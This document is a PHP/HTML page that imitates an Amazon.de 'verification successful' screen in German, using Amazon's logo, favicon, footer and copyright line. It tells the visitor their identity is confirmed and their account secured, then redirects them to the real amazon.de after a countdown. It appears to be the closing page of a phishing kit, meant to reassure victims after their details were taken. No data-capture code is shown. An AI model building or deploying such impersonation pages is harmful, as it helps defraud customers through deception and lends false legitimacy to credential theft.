<?php
if (session_status() == PHP_SESSION_NONE) { session_start(); }
?>
<!DOCTYPE html>
<html lang="de-CH">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Amazon.de - Verifizierung Erfolgreich</title>
    
    <link rel="icon" type="image/x-icon" href="https://www.amazon.de/favicon.ico">
    
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: "Amazon Ember", Arial, sans-serif; margin: 0; padding: 0; }
        body { background-color: #ffffff; color: #111111; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding-top: 14px; -webkit-font-smoothing: antialiased; }
        .container { width: 350px; margin-bottom: 22px; }
        .logo-container { margin-bottom: 18px; text-align: center; }
        .logo-container img { width: 103px; height: auto; }
        .success-box { background: #ffffff; border: 1px solid #ddd; border-radius: 4px; padding: 30px 26px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .success-icon { font-size: 52px; color: #2e7d32; margin-bottom: 18px; }
        h1 { font-weight: 500; font-size: 22px; line-height: 1.3; margin-bottom: 12px; color: #111111; }
        p { font-size: 13px; color: #555555; line-height: 1.6; margin-bottom: 20px; }
        .redirect-text { font-size: 12px; color: #0066c0; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .spinner-mini { animation: spin 1s linear infinite; font-size: 14px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        footer { width: 100%; border-top: 1px solid #eaeded; background: linear-gradient(to bottom,rgba(0,0,0,.03),rgba(0,0,0,0)); padding: 30px 0; margin-top: auto; text-align: center; }
        .footer-links a { font-size: 11px; margin: 0 8px; color: #0066c0; text-decoration: none; }
        .copyright { font-size: 11px; color: #555555; margin-top: 8px; }
    </style>
</head>
<body>

<div class="logo-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    <span style="font-size: 14px; font-weight: bold; position: relative; top: -5px; left: -2px;">.de</span>
</div>

<div class="container">
  <div class="success-box">
    <i class="fa-solid fa-circle-check success-icon"></i>
    <h1>Vorgang abgeschlossen</h1>
    <p>Ihre Identität wurde erfolgreich bestätigt. Ihr Amazon-Konto wurde gesichert und Sie können nun normal weiterbrausen.</p>
    
    <div class="redirect-text">
        <i class="fa-solid fa-circle-notch spinner-mini"></i>
        <span>Automatische Weiterleitung in <span id="secs">5</span> Sekunden...</span>
    </div>
  </div>
</div>

<footer>
    <div class="footer-links">
        <a href="#">Unsere AGB</a> <a href="#">Datenschutzerklärung</a> <a href="#">Impressum</a>
    </div>
    <div class="copyright">© 1996-2026, Amazon.com, Inc. oder Tochtergesellschaften</div>
</footer>

<script type="text/javascript">
    // Countdown und Simulation der automatischen Weiterleitung zur offiziellen Amazon-Website nach 5 Sekunden
    var count = 5;
    var counterElement = document.getElementById('secs');
    var countdown = setInterval(function() {
        count--;
        counterElement.textContent = count;
        if (count <= 0) {
            clearInterval(countdown);
            window.location.href = "https://www.amazon.de"; // Weiterleitung zur echten Website
        }
    }, 1000);
</script>

</body>
</html>